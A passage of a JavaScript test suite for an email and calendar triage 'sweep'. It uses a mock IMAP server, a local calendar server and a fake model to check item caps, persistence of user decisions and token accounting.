import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import net from 'node:net';
import http from 'node:http';
import path from 'node:path';

process.env.ZELOS_LOG_LEVEL = 'silent';
const HOME_ROOT = fs.mkdtempSync(path.join(os.tmpdir(), 'zelos-sweep-'));
process.env.ZELOS_HOME = path.join(HOME_ROOT, 'home');

const {
  open, close, migrate,
  getItemByKey, itemRowId, setItemState, listBoard, bucketCounts,
  listMessages, listEvents, insertCapture, listCaptures,
  getRun, getKV, setKV, startRun, finishRun,
} = await import('../core/db.mjs');
const { SWEEP_KV } = await import('../core/triage.mjs');
const { DEFAULTS } = await import('../core/config.mjs');
const { seedSampleData } = await import('../core/sample-data.mjs');
const { nowISO, dayKey } = await import('../core/time.mjs');
const {
  runSweep, shouldRunFull, nextRunAt, isActiveHour, Scheduler, FULL_RUN_MAX_AGE_MS,
  recordTokens,
} = await import('../core/sweep.mjs');
const { sourceStateKey } = await import('../core/connectors/index.mjs');
const { AUTH_BLOCK_MS, secretHash } = await import('../core/connectors/http.mjs');

let seq = 0;
const openDbs = [];
const servers = [];

function fresh() {
  const db = open(path.join(HOME_ROOT, `s${seq++}.db`));
  migrate(db);
  openDbs.push(db);
  return db;
}

test.after(async () => {
  for (const db of openDbs) close(db);
  for (const server of servers) await new Promise((r) => server.close(r));
  fs.rmSync(HOME_ROOT, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
});

/* ------------------------------------------------------------------ *
 * Fixtures
 * ------------------------------------------------------------------ */

/** A port nothing is listening on: bind one, read it, give it back. */
async function closedPort() {
  const server = net.createServer();
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const { port } = server.address();
  await new Promise((r) => server.close(r));
  return port;
}

/* ------------------------------------------------------------------ *
 * A mock IMAP server
 *
 * The sweep's own mail reader is a default, not an injection: `deps.fetchMail`
 * replaces it, so every other test in this file never opens an IMAP socket at
 * all — and that is exactly why the option the reader forwards to the client
 * could go missing without a single test noticing. These tests take the default
 * path on purpose, against a real socket on 127.0.0.1 speaking real IMAP.
 * ------------------------------------------------------------------ */

const HEADER_SECTION = 'HEADER.FIELDS (FROM TO CC SUBJECT DATE MESSAGE-ID IN-REPLY-TO REFERENCES LIST-ID)';
const PLAIN_TEXT_STRUCTURE = '("TEXT" "PLAIN" ("CHARSET" "UTF-8") NIL NIL "7BIT" 120 4 NIL NIL NIL NIL)';
const MOCK_HEADERS = [
  'From: Priya Raman <priya@raman.example>',
  'To: Nemo Hale <nemo@example.com>',
  'Subject: Dates for the walkthrough',
  'Date: Fri, 07 Aug 2026 09:15:00 +0000',
  'Message-ID: <mock-1@raman.example>',
  '',
  '',
].join('\r\n');

/**
 * One mailbox, one message, and every line the client sent. `capability` is the
 * lever the TLS tests pull: a list without STARTTLS in it is precisely what a
 * machine in the middle would send, and is indistinguishable — from the client's
 * side — from a server that simply cannot do TLS.
 */
async function startMockImap({ capability = 'IMAP4rev1' } = {}) {
  const received = [];
  const sockets = new Set();

  const server = net.createServer((socket) => {
    sockets.add(socket);
    socket.setNoDelay(true);
    socket.on('error', () => {});
    socket.on('close', () => sockets.delete(socket));
    socket.write('* OK Zelos sweep mock ready\r\n');

    let buffer = '';
    socket.on('data', (chunk) => {
      buffer += chunk.toString('latin1');
      let idx;
      while ((idx = buffer.indexOf('\r\n')) >= 0) {
        const line = buffer.slice(0, idx);
        buffer = buffer.slice(idx + 2);
        received.push(line);

        const parts = line.split(' ');
        const tag = parts[0] || '';
        const verb = (parts[1] || '').toUpperCase() === 'UID'
          ? `UID ${(parts[2] || '').toUpperCase()}`
          : (parts[1] || '').toUpperCase();
        const send = (text) => socket.write(text);

        if (verb === 'CAPABILITY') {
          send(`* CAPABILITY ${capability}\r\n${tag} OK CAPABILITY completed\r\n`);
        } else if (verb === 'LOGIN') {
          send(`${tag} OK LOGIN completed\r\n`);
        } else if (verb === 'SELECT' || verb === 'EXAMINE') {
          send('* 1 EXISTS\r\n* OK [UIDVALIDITY 1] UIDs valid\r\n'
            + `${tag} OK [READ-ONLY] EXAMINE completed\r\n`);
        } else if (verb === 'UID SEARCH') {
          send(`* SEARCH 101\r\n${tag} OK UID SEARCH completed\r\n`);
        } else if (verb === 'UID FETCH') {
          if (line.includes('BODYSTRUCTURE')) {
            send(`* 1 FETCH (UID 101 FLAGS (\\Seen) INTERNALDATE "07-Aug-2026 09:15:00 +0000" `
              + `BODYSTRUCTURE ${PLAIN_TEXT_STRUCTURE} BODY[${HEADER_SECTION}] {${MOCK_HEADERS.length}}\r\n`
              + `${MOCK_HEADERS})\r\n${tag} OK UID FETCH completed\r\n`);
          } else {
            const payload = 'Either the 28th or the 30th works.\r\n';
            send(`* 1 FETCH (UID 101 BODY[1] {${payload.length}}\r\n${payload})\r\n`
              + `${tag} OK UID FETCH completed\r\n`);
          }
        } else if (verb === 'LOGOUT') {
          send(`* BYE\r\n${tag} OK LOGOUT completed\r\n`);
        } else {
          send(`${tag} BAD unexpected command in mock\r\n`);
        }
      }
    });
  });

  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  servers.push(server);
  return {
    port: server.address().port,
    received,
    sawCredentials: () => received.some((l) => /LOGIN|AUTHENTICATE/i.test(l)),
    destroy: () => { for (const s of sockets) s.destroy(); },
  };
}

/**
 * Whether this machine routes 0.0.0.0 to a listener bound on loopback. macOS and
 * Linux do; Windows refuses the connect outright. It is the only address that is
 * reachable in a test and is *not* loopback as far as core/sources/imap.mjs is
 * concerned, which is what a non-loopback case needs — so where it does not
 * work, that half of the test is skipped rather than faked.
 */
async function nonLoopbackAliasReaches(port) {
  // Windows does not route it, and the probe itself is not free there: a
  // connect to 0.0.0.0 can sit without ever refusing, which turns a skipped
  // test into a hung CI job. So the answer is known in advance rather than
  // measured, and no socket is opened at all.
  if (process.platform === 'win32') return false;
  return new Promise((resolve) => {
    const socket = net.connect({ host: '0.0.0.0', port });
    let settled = false;
    const done = (ok) => {
      if (settled) return;
      settled = true;
      socket.destroy();
      resolve(ok);
    };
    // Belt as well as braces: setTimeout covers an idle socket, the timer
    // covers a connect that never resolves either way.
    socket.setTimeout(2_000, () => done(false));
    const bail = setTimeout(() => done(false), 3_000);
    bail.unref();
    socket.on('connect', () => done(true));
    socket.on('error', () => done(false));
  });
}

function icsDocument(startMs) {
  const stamp = (ms) => new Date(ms).toISOString().replace(/[-:]/g, '').replace(/\.\d{3}/, '');
  return [
    'BEGIN:VCALENDAR',
    'VERSION:2.0',
    'PRODID:-//Zelos test//EN',
    'X-WR-CALNAME:Work',
    'BEGIN:VEVENT',
    'UID:precon-9001',
    `DTSTAMP:${stamp(startMs - 86_400_000)}`,
    `DTSTART:${stamp(startMs)}`,
    `DTEND:${stamp(startMs + 3_600_000)}`,
    'SUMMARY:Pre-con with Alder & Vance',
    'LOCATION:Site trailer',
    'DESCRIPTION:Bring the retainage figure',
    'ORGANIZER;CN=Marcus Reyes:mailto:marcus@riverstone.example',
    'END:VEVENT',
    'END:VCALENDAR',
    '',
  ].join('\r\n');
}

/** A local .ics host. No third party is contacted by any test in this file. */
async function icsServer(body) {
  let hits = 0;
  const server = http.createServer((req, res) => {
    hits += 1;
    res.writeHead(200, { 'content-type': 'text/calendar; charset=utf-8' });
    res.end(body);
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  servers.push(server);
  return { url: `http://127.0.0.1:${server.address().port}/work.ics`, hits: () => hits };
}

function baseConfig(over = {}) {
  return {
    version: 1,
    identity: { name: 'Nemo Hale', email: 'nemo@example.com', timezone: 'UTC' },
    model: {
      protocol: 'openai',
      label: 'Test model',
      baseUrl: 'http://127.0.0.1:1/v1',
      model: 'test-model',
      keyRef: 'model.default',
      maxTokens: 2048,
      temperature: 0,
    },
    mail: [],
    calendars: [],
    sweep: { intervalMinutes: 30, activeHours: [6, 23], auto: true },
    ui: { theme: 'marble' },
    privacy: { maxItemsPerSweep: 150, sendBodies: true, bodyChars: 4000 },
    ...over,
  };
}

function mailAccount(over = {}) {
  return {
    id: 'm_work',
    enabled: true,
    label: 'Work',
    host: 'imap.example.invalid',
    port: 993,
    secure: true,
    user: 'nemo@example.com',
    keyRef: 'mail.m_work',
    mailboxes: ['INBOX'],
    sentMailbox: 'Sent',
    lookbackDays: 14,
    maxMessages: 50,
    ...over,
  };
}

/** A record shaped like one from imap.fetchRecent. */
function fetched(over = {}) {
  return {
    uid: 1,
    messageId: '<a@example.com>',
    inReplyTo: '',
    references: [],
    threadKey: 'thread-a',
    from: { name: 'Priya Raman', email: 'john@raman.example' },
    to: [{ name: 'Nemo', email: 'nemo@example.com' }],
    cc: [],
    subject: 'Dates for the walkthrough',
    /* An hour ago, off the real clock. The prompt window is 21 days back from
       now and `runSweep` takes no clock, so a fixed date here fell out of
       every prompt assertion three weeks after it was written. */
    date: new Date(Date.now() - 3_600_000).toISOString(),
    snippet: 'Either the 28th or the 30th works',
    text: 'Either the 28th or the 30th works on our end.',
    hasAttachments: false,
    flags: [],
    folder: 'INBOX',
    ...over,
  };
}

/** A model that returns exactly what a test tells it to, and counts its calls. */
function fakeModel(reply) {
  const calls = [];
  const fn = async (opts) => {
    calls.push(opts);
    const body = typeof reply === 'function' ? reply(calls.length, opts) : reply;
    if (body instanceof Error) throw body;
    return {
      text: typeof body === 'string' ? body : JSON.stringify(body),
      usage: { input: 1234, output: 567 },
      model: 'test-model',
      raw: {},
    };
  };
  fn.calls = calls;
  return fn;
}

const SECRETS = async () => 'a-password';

function board(items, over = {}) {
  return { first: null, items, notes: ['A quiet morning.'], ...over };
}

function item(over = {}) {
  return {
    key: 'thread-a',
    bucket: 'waiting',
    headline: 'Answer Priya Raman on the Jul 28 dates',
    why: 'He offered two dates and has had no reply.',
    person: 'Priya Raman',
    personEmail: 'john@raman.example',
    dueAt: null,
    severity: 2,
    sourceRefs: [],
    link: null,
    ...over,
  };
}

/* ================================================================== *
 * runSweep
 * ================================================================== */

test('a full run fetches, persists, thinks and merges', async () => {
  const db = fresh();
  const model = fakeModel(board([item(), item({ key: 'k2', bucket: 'today', headline: 'Draw the retainage figure' })]));
  const config = baseConfig({ mail: [mailAccount()] });

  const phases = [];
  const result = await runSweep({
    db,
    config,
    onProgress: (p) => phases.push(p.phase),
    deps: {
      getSecret: SECRETS,
      complete: model,
      fetchMail: async ({ mailbox }) =>
        mailbox === 'Sent'
          ? [fetched({ uid: 9, messageId: '<s@example.com>', threadKey: 'thread-a', folder: 'Sent', subject: 'Re: Dates', text: "I'll confirm tomorrow." })]
          : [fetched(), fetched({ uid: 2, messageId: '<b@example.com>', threadKey: 'thread-b', subject: 'Invoice 4471' })],
    },
  });

  assert.equal(result.ok, true, result.error);
  assert.equal(model.calls.length, 1);
  assert.equal(result.stats.kind, 'full');
  assert.equal(result.stats.messages, 3);
  assert.equal(result.stats.items, 2);
  assert.equal(result.stats.tokensIn, 1234);
  assert.equal(result.stats.tokensOut, 567);
  assert.ok(result.stats.ms >= 0);
  assert.equal(listMessages(db).length, 3);
  assert.ok(getItemByKey(db, 'thread-a'));
  assert.deepEqual(result.notes, ['A quiet morning.']);

  // The sent mailbox is read too — `promised` cannot exist without it.
  const out = listMessages(db, { direction: 'out' });
  assert.equal(out.length, 1);
  assert.equal(out[0].folder, 'Sent');

  assert.deepEqual(phases.slice(0, 3), ['start', 'fetch', 'persist']);
  assert.ok(phases.includes('think'));
  assert.ok(phases.includes('merge'));
  assert.equal(phases.at(-1), 'done');

  const run = getRun(db, result.runId);
  assert.equal(run.ok, true);
  assert.equal(run.kind, 'full');
  assert.equal(run.tokens_in, 1234);
});

test('the four-item now bar holds end to end, through a real model reply', async () => {
  const db = fresh();
  const six = [0, 1, 2, 3, 4, 5].map((i) => item({
    key: `urgent-${i}`,
    bucket: 'now',
    headline: `Deal with the urgent thing number ${i}`,
    severity: i,
  }));
  // Wrapped in prose and a fence, the way a small local model actually answers.
  const model = fakeModel(`Sure! Here is the board:\n\n\`\`\`json\n${JSON.stringify(board(six))}\n\`\`\`\nHope that helps.`);

  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });

  assert.equal(result.ok, true, result.error);
  assert.equal(result.stats.now, 4, 'exactly four survive as now');
  const counts = bucketCounts(db);
  assert.equal(counts.now, 4);
  assert.equal(counts.today, 2, 'the other two were demoted, not deleted');
  assert.equal(listBoard(db).length, 6);
  assert.equal(getItemByKey(db, 'urgent-0').bucket, 'today');
  assert.equal(getItemByKey(db, 'urgent-5').bucket, 'now');
});

/** Four legal `now` items under one prefix — one whole reply's worth. */
function fourNow(prefix, severity) {
  return [0, 1, 2, 3].map((i) => item({
    key: `${prefix}-${i}`,
    bucket: 'now',
    headline: `Deal with the ${prefix} thing number ${i}`,
    severity,
  }));
}

test('the four-item now bar holds on the persisted board, not only per model reply', async () => {
  const db = fresh();
  // Two runs, disjoint keys, each reply perfectly legal on its own. safety.mjs
  // clamps a reply; nothing used to clamp the board, so this left eight open
  // `now` items and made the loudest thing the product says untrue.
  const model = fakeModel((call) => board(call === 1 ? fourNow('older', 1) : fourNow('newer', 3)));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  const first = await runSweep({ db, config, mode: 'full', deps });
  assert.equal(first.stats.now, 4, 'four on their own are within the bar');
  assert.equal(bucketCounts(db).now, 4);

  const second = await runSweep({ db, config, mode: 'full', deps });

  assert.equal(second.ok, true, second.error);
  const counts = bucketCounts(db);
  assert.equal(counts.now, 4, 'the board holds four whatever the replies each did');
  assert.equal(counts.today, 4, 'the overflow was demoted');
  assert.equal(second.stats.now, 4, 'and the run reports the board, not the reply');

  const open = listBoard(db, { states: ['open'] });
  assert.equal(open.length, 8, 'nothing was deleted to make the number work');
  assert.deepEqual(
    open.filter((row) => row.bucket === 'now').map((row) => row.payload.key).sort(),
    ['newer-0', 'newer-1', 'newer-2', 'newer-3'],
    'the four that keep the bucket are the four the board itself ranks first',
  );
  for (const key of ['older-0', 'older-1', 'older-2', 'older-3']) {
    const row = getItemByKey(db, key);
    assert.equal(row.bucket, 'today', `${key} should have been demoted`);
    assert.equal(row.state, 'open', 'demotion changes the bucket and nothing else');
  }
});

test('the board-level now bar demotes open items only, never a decision the user made', async () => {
  const db = fresh();
  const model = fakeModel((call) => board(call === 1 ? fourNow('older', 1) : fourNow('newer', 3)));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  await runSweep({ db, config, mode: 'full', deps });
  setItemState(db, itemRowId('older-0'), 'snoozed');
  setItemState(db, itemRowId('older-1'), 'done');

  await runSweep({ db, config, mode: 'full', deps });

  assert.equal(bucketCounts(db, { states: ['open'] }).now, 4);
  const snoozed = getItemByKey(db, 'older-0');
  assert.equal(snoozed.state, 'snoozed');
  assert.equal(snoozed.bucket, 'now', 'a snoozed item is not competing for the bar, so it is left alone');
  const finished = getItemByKey(db, 'older-1');
  assert.equal(finished.state, 'done');
  assert.equal(finished.bucket, 'now', 'and neither is a finished one');
  assert.equal(getItemByKey(db, 'older-2').bucket, 'today', 'the open ones are what give way');
  assert.equal(getItemByKey(db, 'older-3').bucket, 'today');
});

test('a light run holds the bar too, without asking the model anything', async () => {
  const db = fresh();
  const model = fakeModel((call) => board(call === 1 ? fourNow('older', 1) : fourNow('newer', 3)));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  await runSweep({ db, config, mode: 'full', deps });
  await runSweep({ db, config, mode: 'full', deps });
  // Put the board back over the bar behind the sweep's back, the way the user
  // reopening two demoted items does.
  setItemState(db, itemRowId('older-0'), 'open');
  setItemState(db, itemRowId('older-1'), 'open');
  db.prepare("UPDATE items SET bucket = 'now' WHERE id IN (?, ?)")
    .run(itemRowId('older-0'), itemRowId('older-1'));
  assert.equal(bucketCounts(db).now, 6);

  const light = await runSweep({ db, config, mode: 'light', deps });

  assert.equal(model.calls.length, 2, 'the light run cost nothing');
  assert.equal(light.counts.now, 4);
  assert.equal(bucketCounts(db).now, 4);
  assert.equal(listBoard(db, { states: ['open'] }).length, 8, 'still nothing deleted');
});

test('the demo week yields the now bar to real severity-3 work', async () => {
  const db = fresh();
  seedSampleData(db);
  // Three genuine now items, all due later than the demo's two — so the board's
  // own order ranked the fiction first and demoted a real item to make room for
  // items about people who do not exist.
  const due = (h) => new Date(Date.now() + h * 3_600_000).toISOString();
  const three = [0, 1, 2].map((i) => item({
    key: `real-${i}`, bucket: 'now', severity: 3, dueAt: due(30 + i),
    headline: `Deal with the real thing number ${i}`,
  }));
  const model = fakeModel(board(three));
  const result = await runSweep({
    db,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
  });

  assert.equal(result.ok, true, result.error);
  assert.equal(bucketCounts(db).now, 4, 'the bar still holds four');
  for (const key of ['real-0', 'real-1', 'real-2']) {
    assert.equal(getItemByKey(db, key).bucket, 'now',
      `${key} must not lose its place to an item about people who do not exist`);
  }
  const sampleInNow = listBoard(db, { states: ['open'], buckets: ['now'] })
    .filter((i) => i.payload?.sample === true);
  assert.equal(sampleInNow.length, 1, 'the demo keeps only the slot the real work left over');
  const demoted = getItemByKey(db, 'sample-marked-up-drawings');
  assert.equal(demoted.bucket, 'today', 'the demo item that lost its place was demoted, not deleted');
  assert.equal(demoted.state, 'open');
});

test('a finished item\'s key is named to the next run as already handled', async () => {
  const db = fresh();
  const model = fakeModel(board([item()]));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  await runSweep({ db, config, mode: 'full', deps });
  setItemState(db, itemRowId('thread-a'), 'done');
  await runSweep({ db, config, mode: 'full', deps });

  const firstPrompt = model.calls[0].messages[0].content;
  const secondPrompt = model.calls[1].messages[0].content;
  assert.ok(!firstPrompt.includes('ALREADY HANDLED'),
    'nothing is claimed to be handled on the run that had nothing to handle');
  assert.match(secondPrompt, /ALREADY HANDLED — DO NOT RAISE THESE AGAIN/);
  assert.match(secondPrompt, /key=thread-a · done/);
  assert.ok(secondPrompt.includes('Answer Priya Raman on the Jul 28 dates'),
    'the headline travels with the key, so the same obligation is recognisable in other words');
});

/**
 * REGRESSION. The WHERE read the stored timestamps as instants — through
 * datetime(), because they carry the user's offset — and the ORDER BY then read
 * the very same column as characters. The rows that survived the LIMIT were
 * therefore chosen by how the offset happened to sort, so the most recent thing
 * the user finished could be the one row dropped, and the model would raise it
 * again.
 */
test('the most recently closed item survives the limit whatever offset it was closed in', async () => {
  const db = fresh();
  const RESOLVED_LIMIT = 40;
  const keys = [...Array(RESOLVED_LIMIT).keys()].map((i) => `resolved-early-${i}`);
  const LATE = 'resolved-late';

  const first = fakeModel(board([...keys, LATE].map((key) => item({ key, headline: `Finish ${key}` }))));
  const config = baseConfig({ mail: [mailAccount()] });
  const fetchMail = async () => [fetched()];
  await runSweep({ db, config, mode: 'full', deps: { getSecret: SECRETS, complete: first, fetchMail } });

  /** The same instant, written the way a user in that zone would see it. */
  const zoned = (ms, offsetHours) => {
    const sign = offsetHours < 0 ? '-' : '+';
    const wall = new Date(ms + offsetHours * 3_600_000).toISOString().slice(0, 19);
    return `${wall}${sign}${String(Math.abs(offsetHours)).padStart(2, '0')}:00`;
  };
  // Forty closed five days ago in UTC+12, and one closed six hours *later* in
  // UTC-12. As instants the late one is the newest; as text it is the oldest of
  // the lot, so string ordering drops exactly the row that matters most.
  const baseMs = Date.now() - 5 * 86_400_000;
  for (const key of keys) setItemState(db, itemRowId(key), 'done', { now: zoned(baseMs, 12) });
  setItemState(db, itemRowId(LATE), 'done', { now: zoned(baseMs + 6 * 3_600_000, -12) });

  const second = fakeModel(board([]));
  await runSweep({ db, config, mode: 'full', deps: { getSecret: SECRETS, complete: second, fetchMail } });

  const prompt = second.calls[0].messages[0].content;
  assert.match(prompt, /ALREADY HANDLED/);
  assert.ok(prompt.includes(`key=${LATE}`),
    'the newest decision the user made was dropped by the limit');
});

/**
 * The old ceiling of forty was priced for full lines; a busy three weeks can
 * close more items than that, and everything past the ceiling never reached the
 * prompt at all — the same silent gap the compact keys line exists to close.
 * Now that a closed item past the full lines costs only its key, the ceiling
 * matches the 120 the prior board itself may carry.
 */
test('a busy three weeks of finished work is fenced off whole, not just the last forty', async () => {
  const db = fresh();
  const keys = [...Array(60).keys()].map((i) => `finished-${String(i).padStart(2, '0')}`);
  const first = fakeModel(board(keys.map((key) => item({ key, headline: `Finish ${key}` }))));
  const config = baseConfig({ mail: [mailAccount()] });
  const fetchMail = async () => [fetched()];
  await runSweep({ db, config, mode: 'full', deps: { getSecret: SECRETS, complete: first, fetchMail } });
  for (const key of keys) setItemState(db, itemRowId(key), 'done');

  const second = fakeModel(board([]));
  await runSweep({ db, config, mode: 'full', deps: { getSecret: SECRETS, complete: second, fetchMail } });

  const prompt = second.calls[0].messages[0].content;
  for (const key of keys) {
    assert.ok(prompt.includes(key), `${key} never reached the prompt, so nothing stops it being re-raised`);
  }
});

test('a model that is told what was handled does not resurrect it under a new key', async () => {
  const db = fresh();
  const WORK = 'Answer Priya Raman on the Jul 28 dates';
  // A stand-in for a model that follows its instructions: the mail that produced
  // this obligation is still in front of it every run, so it writes the item up
  // again — under a fresh key, because a finished key is not on the prior board —
  // unless the prompt tells it the work is closed. No code can undo a re-key
  // after the fact, which is exactly why the prompt has to carry the closed keys.
  const model = fakeModel((call, opts) => {
    const shown = opts.messages[0].content;
    const toldItIsHandled = shown.includes('ALREADY HANDLED') && /key=thread-a\b/.test(shown);
    if (call === 1) return board([item({ key: 'thread-a', headline: WORK })]);
    return board(toldItIsHandled ? [] : [item({ key: 'thread-a-again', headline: WORK })]);
  });
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  await runSweep({ db, config, mode: 'full', deps });
  setItemState(db, itemRowId('thread-a'), 'done');
  const second = await runSweep({ db, config, mode: 'full', deps });

  assert.equal(second.ok, true, second.error);
  assert.equal(getItemByKey(db, 'thread-a').state, 'done', 'the decision stands');
  assert.equal(getItemByKey(db, 'thread-a-again'), null, 'and was not re-minted under another key');
  assert.deepEqual(
    listBoard(db, { states: ['open'] }).filter((row) => row.headline === WORK),
    [],
    'the board holds no live copy of work the user finished',
  );
  assert.equal(
    listBoard(db, { states: ['done'] }).filter((row) => row.headline === WORK).length,
    1,
    'exactly one copy exists, and it is the one they closed',
  );
});

test('a successful run records what it spent where the UI can read it', async () => {
  const db = fresh();
  const model = fakeModel(board([item()]));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  await runSweep({ db, config, mode: 'full', deps });
  const afterOne = JSON.parse(getKV(db, SWEEP_KV.tokens));
  assert.match(afterOne.day, /^\d{4}-\d{2}-\d{2}$/);
  assert.equal(afterOne.tokensIn, 1234);
  assert.equal(afterOne.tokensOut, 567);
  assert.equal(afterOne.runs, 1);
  assert.equal(afterOne.modelRuns, 1);
  assert.deepEqual(afterOne.lifetime, { tokensIn: 1234, tokensOut: 567, runs: 1, modelRuns: 1 });
  assert.ok(afterOne.at, 'the totals say when they were last touched');

  await runSweep({ db, config, mode: 'full', deps });
  const afterTwo = JSON.parse(getKV(db, SWEEP_KV.tokens));
  assert.equal(afterTwo.tokensIn, 2468, 'the day accumulates');
  assert.equal(afterTwo.tokensOut, 1134);
  assert.equal(afterTwo.runs, 2);
  assert.equal(afterTwo.lifetime.tokensIn, 2468);

  await runSweep({ db, config, mode: 'light', deps });
  const afterLight = JSON.parse(getKV(db, SWEEP_KV.tokens));
  assert.equal(afterLight.tokensIn, 2468, 'a light run spends nothing and adds nothing');
  assert.equal(afterLight.runs, 3);
  assert.equal(afterLight.modelRuns, 2, 'and does not count as a run that thought');
});

/**
 * REGRESSION. The spend was recorded only `if (ok)`, which erased exactly the
 * spend a person is most likely to be surprised by: the model answered, the
 * provider billed for it, and the run then failed because the answer was not a
 * board. The counter showed nothing, and the bill showed the tokens.
 */
test('a run that failed still records what the model was paid for', async () => {
  const db = fresh();
  const config = baseConfig({ mail: [mailAccount()] });
  const fetchMail = async () => [fetched()];

  await runSweep({
    db, config, mode: 'full',
    deps: { getSecret: SECRETS, complete: fakeModel(board([item()])), fetchMail },
  });

  const failed = await runSweep({
    db, config, mode: 'full',
    deps: { getSecret: SECRETS, complete: fakeModel('I am terribly sorry, I cannot help with that.'), fetchMail },
  });
  assert.equal(failed.ok, false);

  const after = JSON.parse(getKV(db, SWEEP_KV.tokens));
  assert.equal(after.tokensIn, 2468, 'the tokens the failed reply cost are in the total');
  assert.equal(after.tokensOut, 1134);
  assert.equal(after.lifetime.tokensIn, 2468);
  // The counts answer a different question from the spend, and a run that
  // produced no board is not a sweep that happened.
  assert.equal(after.runs, 1, 'a failed run is not counted as a sweep');
  assert.equal(after.modelRuns, 1);
});

/**
 * REGRESSION. recordTokens caught a *read* it could not parse and then wrote
 * outside that guard, from an unguarded call in finish() — so a kv table that
 * refused a write turned a finished sweep, board and all, into a failed one over
 * a number in the corner of the screen.
 */
test('a token counter that cannot be written does not cost the user the board', async () => {
  const db = fresh();
  // Everything the run does works, except the one statement that stores the
  // counter. Nothing else in the sweep touches this key.
  const brittle = new Proxy(db, {
    get(target, prop, receiver) {
      const value = Reflect.get(target, prop, receiver);
      if (prop !== 'prepare') return typeof value === 'function' ? value.bind(target) : value;
      return (sql) => {
        const stmt = target.prepare(sql);
        if (!sql.includes('INSERT INTO kv')) return stmt;
        return {
          run: (...args) => {
            if (args[0] === SWEEP_KV.tokens) throw new Error('database or disk is full');
            return stmt.run(...args);
          },
          get: (...args) => stmt.get(...args),
          all: (...args) => stmt.all(...args),
        };
      };
    },
  });

  const result = await runSweep({
    db: brittle,
    config: baseConfig({ mail: [mailAccount()] }),
    mode: 'full',
    deps: { getSecret: SECRETS, complete: fakeModel(board([item()])), fetchMail: async () => [fetched()] },
  });

  assert.equal(result.ok, true, result.error);
  assert.equal(result.stats.items, 1);
  assert.ok(getItemByKey(db, 'thread-a'), 'the board the user waited for is on disk');
  assert.equal(getKV(db, SWEEP_KV.tokens), null, 'and only the number was lost');
});

test('the token totals start again on a new day rather than growing forever', async () => {
  const db = fresh();
  const model = fakeModel(board([item()]));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  await runSweep({ db, config, mode: 'full', deps });
  const yesterday = { ...JSON.parse(getKV(db, SWEEP_KV.tokens)), day: '2000-01-01' };
  setKV(db, SWEEP_KV.tokens, JSON.stringify(yesterday));

  await runSweep({ db, config, mode: 'full', deps });
  const today = JSON.parse(getKV(db, SWEEP_KV.tokens));

  assert.equal(today.tokensIn, 1234, 'today counts only today');
  assert.equal(today.runs, 1);
  assert.notEqual(today.day, '2000-01-01');
  assert.equal(today.lifetime.tokensIn, 2468, 'while the lifetime total keeps everything');
  assert.equal(today.lifetime.runs, 2);
});

test('what the user decided survives the next run', async () => {
  const db = fresh();
  const model = fakeModel(board([item(), item({ key: 'k2', bucket: 'today', headline: 'Draw the retainage figure' })]));
  const config = baseConfig({ mail: [mailAccount()] });
  const deps = { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] };

  await runSweep({ db, config, mode: 'full', deps });
  const id = itemRowId('thread-a');
  const before = getItemByKey(db, 'thread-a');
  setItemState(db, id, 'done');

  await runSweep({ db, config, mode: 'full', deps });
  const after = getItemByKey(db, 'thread-a');

  assert.equal(after.state, 'done', 'the model does not get to reopen it');
  assert.equal(after.seen_runs, 2, 'but it is still recognised as the same obligation');
  assert.equal(after.first_seen, before.first_seen);
  assert.equal(model.calls.length, 2);
});

test('one dead source does not cost the run the others', async () => {
  const db = fresh();
  const deadPort = await closedPort();
  const startsAt = Date.now() + 26 * 3_600_000;
  const cal = await icsServer(icsDocument(startsAt));
  const model = fakeModel(board([item({ key: 'evt-precon', bucket: 'today', headline: 'Bring the retainage figure to the pre-con' })]));

  const config = baseConfig({
    // A real IMAP client against a port with nothing behind it.
    mail: [mailAccount({ id: 'm_dead', label: 'Dead host', host: '127.0.0.1', port: deadPort, secure: false })],
    calendars: [{ id: 'c_work', enabled: true, label: 'Work', kind: 'ics', url: cal.url, user: '', keyRef: null }],
  });

  const result = await runSweep({ db, config, deps: { getSecret: SECRETS, complete: model } });

  assert.equal(result.ok, true, 'the run still produced a board');
  const mailSources = result.stats.sources.filter((s) => s.kind === 'mail');
  assert.equal(mailSources.length, 2, 'INBOX and Sent were both attempted');
  assert.ok(mailSources.every((s) => s.ok === false));
  assert.match(mailSources[0].error, /127\.0\.0\.1|ECONNREFUSED|connect/i,
    `the failure must name what failed, got: ${mailSources[0].error}`);

  const calSource = result.stats.sources.find((s) => s.kind === 'calendar');
  assert.equal(calSource.ok, true);
  assert.equal(calSource.count, 1);
  assert.equal(result.stats.sourcesFailed, 2);
  assert.equal(result.stats.sourcesOk, 1);
  assert.equal(result.stats.events, 1);
  assert.equal(listEvents(db).length, 1);
  assert.equal(listEvents(db)[0].title, 'Pre-con with Alder & Vance');
  assert.equal(model.calls.length, 1, 'the model still got to think about what did arrive');
});

test('a calendar whose kind names no reader is still read as a subscribed .ics', async () => {
  /* enabledSources routes an unrecognised calendar kind — the hand-edited
     `webcal`, a legacy value — to the ics connector on purpose, but
     defaultFetchEvents used to re-derive the reader from `calendar.kind` and
     throw `no calendar reader named webcal`, so the fallback the registry
     promises died one layer down: an internal-error row in the Now banner on
